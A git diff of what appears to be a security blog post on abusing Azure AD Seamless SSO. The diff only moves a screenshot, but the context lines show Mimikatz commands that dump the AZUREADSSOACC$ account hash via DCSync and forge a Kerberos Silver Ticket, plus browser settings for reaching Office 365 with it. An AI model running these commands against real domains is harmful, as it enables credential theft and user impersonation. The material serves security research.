@@ -33,8 +33,6 @@ To&nbsp;test this technique, we need to&nbsp;retrieve some information from&nbsp
     ```bat
     mimikatz.exe "lsadump::dcsync /user:AZUREADSSOACC$" exit
     ```
-    
-    ![Mimikatz Silver Ticket Screenshot](../../assets/images/aad_sso3.png)
 
     My own [DSInternals PowerShell Module](https://github.com/MichaelGrafnetter/DSInternals) could do&nbsp;the same job:
     
@@ -56,6 +54,9 @@ Having this information we can now create and use the Silver Ticket on any Windo
     ```bat
     mimikatz.exe "kerberos::golden /user:elrond /sid:S-1-5-21-2121516926-2695913149-3163778339 /id:1234 /domain:contoso.local /rc4:f9969e088b2c13d93833d0ce436c76dd /target:aadg.windows.net.nsatc.net /service:HTTP /ptt" exit
     ```
+        
+    ![Mimikatz Silver Ticket Screenshot](../../assets/images/aad_sso3.png)
+
 2. Launch *Mozilla Firefox*.
 3. Go to `about:config` and set the [network.negotiate-auth.trusted-uris](https://developer.mozilla.org/en-US/docs/Mozilla/Integrated_authentication) preference to [value](https://docs.microsoft.com/en-us/azure/active-directory/connect/active-directory-aadconnect-sso#ensuring-clients-sign-in-automatically) “https://aadg.windows.net.nsatc.net,https://autologon.microsoftazuread-sso.com”.
 4. Navigate to any web application that is integrated with our AAD domain. We will use [Office 365](https://portal.office.com), which is the most commonly used one.
